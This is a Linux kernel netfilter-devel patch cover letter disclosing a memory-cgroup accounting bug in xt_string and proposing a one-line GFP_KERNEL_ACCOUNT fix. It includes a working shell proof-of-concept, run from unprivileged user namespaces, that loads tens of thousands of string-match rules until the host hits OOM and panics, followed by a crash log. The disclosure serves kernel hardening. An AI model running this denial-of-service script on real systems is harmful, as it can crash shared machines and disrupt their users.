Received: from mail-pf1-f174.google.com (mail-pf1-f174.google.com [209.85.210.174])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2D2F841D652
	for <netfilter-devel@vger.kernel.org>; Mon, 17 Aug 2026 12:45:17 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.174
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786970718; cv=none; b=t7dh3EDAjBgCFulJY2Lj/fDhc2TYq+oHn3k34EzXajV6nXj8R2H+RSy0IOWVIr9wyDRqPj/+v5T3yxG7qYA4qqJ5CNBgnaT/DifPQwQRYJw63q5MZB23nfh1PAPta0bY16NQHIa7R7xZDB4OA2sgRmiQwgpHKna5IgSIl3n3wBU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786970718; c=relaxed/simple;
	bh=nksF6DHzqxMlilXBBpHzkXhgm11AMHgD5rKikurWEwk=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=DgmqoJO+QHSLF3O0gOxsx+8oDF9yYJutNanQpXTjqO1SBjZmn4qwKMmukOuJj77o23faeVhdu6Bg/j4djdIbNwwA6ydj1l4yQGRZaz66Vl7M4haTRtqSutYC6GN2vZmOmfJEh95UCX3WHx/3iQYJ4onIFfTvDvEBdTRGrf2a+kY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; arc=none smtp.client-ip=209.85.210.174
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Received: by mail-pf1-f174.google.com with SMTP id d2e1a72fcca58-8485ef63b68so2500703b3a.1
        for <netfilter-devel@vger.kernel.org>; Mon, 17 Aug 2026 05:45:16 -0700 (PDT)
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786970716; x=1787575516;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=Qe84skFrHspZteTOVVa6EQPkb/h9bgSojkOLVIEGOE0=;
        b=mgQD1x8T8cqCz1S3sFIiN2Yrzczy/9dBBjY6Mwx1rMpt4C87qf890KEZH2FEYYMBbp
         MYKb2Pucf+ZVqWay2wq660klClyOdmW3zetqjIaNVyaqlaO05oquhm8DSqRusMNB3mWX
         dsArGMV955O0O6TjMuFMnK9kx49xRs00fKj2UtxJ9g65jhBmwOB3j78zJLy7UDz4/opz
         3Hbfy0bPmwb4RA0IUes7hVA17ea/McwotDcgw760r4jwUnXsdt3+BHoXUQExTi2CkDMF
         KahF2fb1u5HRzPggXNBezqotnHpyZ0UVJZG3zN7Ys/LFECUnI5XeLvZZE7cAjLEqX3BH
         HB7Q==
X-Gm-Message-State: AOJu0YwmOw/HnK8vwN0iI0kRaJBK3nDcYkiy2rmKPz/zKO+KK/yluoJj
	IGgawU8WdoWtmPZoaACR3IgKDr3H8kqV5TIa9pU+InbmbgyYLIBQYCHVUu9AOyfN5NrZ/0hXg4Q
	4oPNblrcjlGRjfw==
X-Gm-Gg: AR+sD10RVjYtc5X8ZCI644vfGxkqzZPp/k4v5/QIx5/wV7TgfO6BlSBxZOLrTAFobEu
	AazYZnDiPxhfWvD7N4v2KNpxD0P2ureU58c00E9GcmtW+ncUMI5R5Yv+bJSrBr8Vl7GQXyc0FlW
	hElPXuzGyHhGD6NkCMX5c6KSSnNpnJxpL0mGeJ/N+jrZqmO+DGF78Ikkv/OztYRNIjGTb0OU0QL
	LPnq+Lx/Q8gxW6lX9JSB0O3MhjM1+vLnfJMMODrlLwS0RxbL5twkSGrWxYSSEmOJ2616oHk70T6
	3zlm4ZR8pA3ZDyYLM9SKXY/JiYLfg6t4y/kGAzvmZpJvSwRceEwqVPYlWmgSMqsmnKSOMGXx+s8
	Jgg/MRFWxlyV9fdMN2dcE5/K9K1aYW+Qa88dj78swYqmxjD0tj/7I7kEP1Up0nKJfPezpjlyShc
	GcEK9RU9wjf3pfCd2Jj4QGP4D/H+1I9lagG3AMlkAZ2/J1YrTLxAXih8aG1TVXxwtOVUzv2zL42
	9L/APcultc=
X-Received: by 2002:a05:6a00:448e:b0:848:42d0:bc91 with SMTP id d2e1a72fcca58-851b87d91a5mr448932b3a.12.1786970716028;
        Mon, 17 Aug 2026 05:45:16 -0700 (PDT)
Received: from Roxy.localdomain (n220246089185.netvigator.com. [220.246.89.185])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-851b404a4d2sm507548b3a.16.2026.08.17.05.45.11
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 17 Aug 2026 05:45:14 -0700 (PDT)
From: Zhiling Zou zhilinz@nebusec.ai
To: netfilter-devel@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	kaber@trash.net,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH nf 0/1] netfilter: xt_string: account textsearch configs
Date: Mon, 17 Aug 2026 20:44:54 +0800
Message-ID: <cover.1786970189.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in net/netfilter/xt_string.c. The bug is
reachable by a non-root user through a new user and network namespace
with CAP_NET_ADMIN in that namespace.

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

---- details below ----

Bug details:

string_mt_check() creates a textsearch configuration for each installed
xt_string rule with GFP_KERNEL. textsearch_prepare() forwards this mask
to the selected algorithm, so the configuration and its private tables
are not charged to the installing memory cgroup.

The xtables table blob is allocated with GFP_KERNEL_ACCOUNT, but a
Boyer-Moore textsearch configuration is not. A caller can therefore
retain a large number of rules through legacy iptables while keeping the
associated textsearch memory outside its memory-cgroup limit. The
supplied reproducer creates user and network namespaces and bulk-loads
Boyer-Moore string matches until the guest reaches system-wide OOM.

Use GFP_KERNEL_ACCOUNT for textsearch_prepare() so the configuration is
charged with the rest of the rule state.

Reproducer:

    sh poc.sh

------BEGIN poc.sh------

#!/bin/sh
set -eu

MODE=${MODE:-oom}
RULES=${RULES:-50000}
COUNT=${COUNT:-12}
SPAWN_DELAY=${SPAWN_DELAY:-25}
SLEEP_SECS=${SLEEP_SECS:-600}
MEMORY_MAX=${MEMORY_MAX:-128M}
DEMO_RULES=${DEMO_RULES:-30000}
DEMO_WAIT=${DEMO_WAIT:-20}

IPT_RESTORE=/usr/sbin/iptables-legacy-restore
PYTHON=/usr/bin/python3

if [ ! -x "$IPT_RESTORE" ]; then
	echo "missing $IPT_RESTORE" >&2
	exit 1
fi

if [ ! -x "$PYTHON" ]; then
	echo "missing $PYTHON" >&2
	exit 1
fi

PATTERN=$("$PYTHON" - <<'PY'
print("A" * 128)
PY
)

WORKER=/tmp/xt_string_worker.$$.sh
RUNNER=/tmp/xt_string_runner.$$.sh

cleanup() {
	rm -f "$WORKER" "$RUNNER"
}
trap cleanup EXIT INT TERM

cat >"$WORKER" <<EOF
#!/bin/sh
set -eu
RULES=\${1:?missing rules}
SLEEP_SECS=\${2:-600}
LOCK=/tmp/xtables.\$\$
export XTABLES_LOCKFILE="\$LOCK"
PATTERN='$PATTERN'

"$PYTHON" - "\$RULES" "\$PATTERN" <<'PY' | "$IPT_RESTORE"
import sys

rule_count = int(sys.argv[1])
pattern = sys.argv[2]

print("*filter")
print(":INPUT ACCEPT [0:0]")
print(":FORWARD ACCEPT [0:0]")
print(":OUTPUT ACCEPT [0:0]")

rule = f'-A INPUT -m string --algo bm --string "{pattern}" -j ACCEPT'
for _ in range(rule_count):
    print(rule)

print("COMMIT")
PY

sleep "\$SLEEP_SECS"
EOF
chmod 755 "$WORKER"

print_meminfo() {
	egrep 'MemAvailable|Slab|SUnreclaim' /proc/meminfo
}

spawn_one() {
	index=$1
	nohup unshare -Urn "$WORKER" "$RULES" "$SLEEP_SECS" >/tmp/xt_string_ns_"$index".log 2>&1 &
	echo "$!"
}

case "$MODE" in
oom)
	i=1
	while [ "$i" -le "$COUNT" ]; do
		pid=$(spawn_one "$i")
		echo "spawned namespace $i pid $pid"
		sleep "$SPAWN_DELAY"
		print_meminfo
		i=$((i + 1))
	done
	echo "all namespaces spawned; if panic_on_oom is enabled, the guest should panic once memory is exhausted"
	while :; do
		sleep 60
	done
	;;
memcg-demo)
	if [ "$(id -u)" -ne 0 ]; then
		echo "MODE=memcg-demo requires root" >&2
		exit 1
	fi

	CG=/sys/fs/cgroup/xtleak_demo
	mkdir -p "$CG"
	echo "$MEMORY_MAX" >"$CG/memory.max"
	echo max >"$CG/memory.swap.max"

	cat >"$RUNNER" <<'EOF'
#!/bin/sh
set -eu
CG=$1
shift
echo $$ >"$CG/cgroup.procs"
exec "$@"
EOF
	chmod 755 "$RUNNER"

	print_meminfo
	nohup "$RUNNER" "$CG" unshare -n "$WORKER" "$DEMO_RULES" "$SLEEP_SECS" >/tmp/xt_string_memcg.log 2>&1 &
	pid=$!
	sleep "$DEMO_WAIT"
	print_meminfo
	echo -n "memory.current="
	cat "$CG/memory.current"
	echo -n "memory.events="
	tr '\n' ' ' <"$CG/memory.events"
	echo
	echo "demo pid: $pid"
	;;
*)
	echo "unknown MODE=$MODE" >&2
	exit 1
	;;
esac

------END poc.sh--------

----BEGIN crash log----

[ 1416.599400][ T2253] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
[ 1416.600091][ T2253] CPU: 3 UID: 1028 PID: 2253 Comm: iptables-legacy Tainted: G             L     6.12.95 #1 7b931b951f26d30ef9f3f8d44b931a24dbfb5ce6
[ 1416.600959][ T2253] Tainted: [L]=SOFTLOCKUP
[ 1416.601240][ T2253] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 1416.602031][ T2253] Call Trace:
[ 1416.602249][ T2253]  <TASK>
[ 1416.602443][ T2253]  panic+0x544/0x620
[ 1416.602720][ T2253]  ? __pfx_panic+0x10/0x10
[ 1416.603013][ T2253]  ? __pfx_lock_release+0x10/0x10
[ 1416.603361][ T2253]  out_of_memory+0x75d/0x1360
[ 1416.603678][ T2253]  ? __alloc_pages_slowpath.constprop.0+0xa0f/0x2800
[ 1416.604112][ T2253]  ? __pfx_out_of_memory+0x10/0x10
[ 1416.604439][ T2253]  ? __pfx_mutex_trylock+0x10/0x10
[ 1416.604790][ T2253]  __alloc_pages_slowpath.constprop.0+0x1eb8/0x2800
[ 1416.605239][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.605610][ T2253]  ? __pfx___alloc_pages_slowpath.constprop.0+0x10/0x10
[ 1416.606060][ T2253]  ? local_clock_noinstr+0x15/0xd0
[ 1416.606394][ T2253]  ? lock_release+0x687/0xc90
[ 1416.606704][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.607084][ T2253]  ? __pfx___might_resched+0x10/0x10
[ 1416.607440][ T2253]  __alloc_pages_noprof+0x54b/0x760
[ 1416.607788][ T2253]  ? __pfx___alloc_pages_noprof+0x10/0x10
[ 1416.608160][ T2253]  ? __pfx_stack_trace_save+0x10/0x10
[ 1416.608523][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.608902][ T2253]  alloc_pages_mpol_noprof+0x1b1/0x430
[ 1416.609257][ T2253]  ? find_check_entry.isra.0+0x2c6/0x9c0
[ 1416.609623][ T2253]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
[ 1416.610018][ T2253]  ? do_sock_setsockopt+0x1e6/0x3f0
[ 1416.610359][ T2253]  ? __sys_setsockopt+0xe2/0x140
[ 1416.610677][ T2253]  ? __x64_sys_setsockopt+0xbd/0x160
[ 1416.611027][ T2253]  ? do_syscall_64+0x6f/0x150
[ 1416.611331][ T2253]  ? entry_SYSCALL_64_after_hwframe+0x76/0x7e
[ 1416.611740][ T2253]  allocate_slab+0x3ae/0x550
[ 1416.612051][ T2253]  ___slab_alloc+0xdcb/0x1620
[ 1416.612354][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.612728][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.613093][ T2253]  ? local_clock_noinstr+0x15/0xd0
[ 1416.613425][ T2253]  ? bm_init+0x37/0x9c0
[ 1416.613705][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.614089][ T2253]  ? __kmalloc_noprof+0x3e8/0x540
[ 1416.614417][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.614790][ T2253]  __kmalloc_noprof+0x3e8/0x540
[ 1416.615106][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.615467][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.615843][ T2253]  ? bm_init+0x37/0x9c0
[ 1416.616124][ T2253]  ? bm_init+0x37/0x9c0
[ 1416.616396][ T2253]  bm_init+0x37/0x9c0
[ 1416.616661][ T2253]  ? lock_acquire+0x153/0x2f0
[ 1416.616970][ T2253]  ? textsearch_prepare+0x4d/0x3a0
[ 1416.617311][ T2253]  textsearch_prepare+0x15d/0x3a0
[ 1416.617654][ T2253]  string_mt_check+0x15d/0x1f0
[ 1416.617971][ T2253]  ? __mutex_unlock_slowpath+0x163/0x630
[ 1416.618335][ T2253]  xt_check_match+0x23c/0xb30
[ 1416.618648][ T2253]  ? __pfx_xt_check_match+0x10/0x10
[ 1416.618999][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.619512][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.619975][ T2253]  ? pcpu_alloc_noprof+0x6e3/0xc80
[ 1416.620424][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.620865][ T2253]  ? xt_find_match+0x150/0x1f0
[ 1416.621247][ T2253]  find_check_entry.isra.0+0x2c6/0x9c0
[ 1416.621633][ T2253]  ? __pfx_find_check_entry.isra.0+0x10/0x10
[ 1416.622116][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.622497][ T2253]  ? trace_hardirqs_on+0x5b/0x110
[ 1416.622844][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.623223][ T2253]  ? kfree+0x143/0x4a0
[ 1416.623506][ T2253]  ? translate_table+0xb00/0x1af0
[ 1416.623851][ T2253]  translate_table+0xbd3/0x1af0
[ 1416.624190][ T2253]  ? __pfx_translate_table+0x10/0x10
[ 1416.624545][ T2253]  ? _copy_from_user+0x4e/0xa0
[ 1416.624872][ T2253]  do_ipt_set_ctl+0x3ea/0x9c0
[ 1416.625191][ T2253]  ? __pfx_do_ipt_set_ctl+0x10/0x10
[ 1416.625524][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.625889][ T2253]  ? __mutex_unlock_slowpath+0x163/0x630
[ 1416.626248][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.626611][ T2253]  ? __pfx___mutex_unlock_slowpath+0x10/0x10
[ 1416.627022][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.627392][ T2253]  nf_setsockopt+0x76/0xe0
[ 1416.627689][ T2253]  do_sock_setsockopt+0x1e6/0x3f0
[ 1416.628022][ T2253]  ? __pfx_do_sock_setsockopt+0x10/0x10
[ 1416.628385][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.628748][ T2253]  ? find_held_lock+0x34/0x120
[ 1416.629058][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.629430][ T2253]  ? local_clock_noinstr+0x15/0xd0
[ 1416.629770][ T2253]  ? lock_release+0x687/0xc90
[ 1416.630083][ T2253]  ? __pfx_lock_release+0x10/0x10
[ 1416.630417][ T2253]  ? __pfx_lock_release+0x10/0x10
[ 1416.630764][ T2253]  __sys_setsockopt+0xe2/0x140
[ 1416.631091][ T2253]  __x64_sys_setsockopt+0xbd/0x160
[ 1416.631424][ T2253]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1416.631788][ T2253]  ? trace_hardirqs_on+0x5b/0x110
[ 1416.632116][ T2253]  do_syscall_64+0x6f/0x150
[ 1416.632415][ T2253]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[ 1416.632813][ T2253] RIP: 0033:0x7882ac8872ba
[ 1416.633100][ T2253] Code: 48 83 ec 10 48 63 c9 48 63 ff 45 89 c9 6a 2c e8 fc d3 f7 ff 48 83 c4 18 c3 0f 1f 80 00 00 00 00 49 89 ca b8 36 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 06 c3 0f 1f 44 00 00 48 8b 15 21 2b 0d 00 f7
[ 1416.634327][ T2253] RSP: 002b:00007ffcfcf9e448 EFLAGS: 00000246 ORIG_RAX: 0000000000000036
[ 1416.634866][ T2253] RAX: ffffffffffffffda RBX: 00007882ab70b070 RCX: 00007882ac8872ba
[ 1416.635373][ T2253] RDX: 0000000000000040 RSI: 0000000000000000 RDI: 0000000000000004
[ 1416.635887][ T2253] RBP: 00007882ab70b010 R08: 0000000001067658 R09: 0000570b6297a2b0
[ 1416.636391][ T2253] R10: 00007882ab70b010 R11: 0000000000000246 R12: 00007882ab647010
[ 1416.636900][ T2253] R13: 0000570b6297a2b8 R14: 0000570b6297a870 R15: 0000570b6297a870
[ 1416.637421][ T2253]  </TASK>
[ 1416.637920][ T2253] Kernel Offset: disabled
[ 1416.638206][ T2253] Rebooting in 10 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  netfilter: xt_string: account textsearch configs

 net/netfilter/xt_string.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

-- 
2.43.0
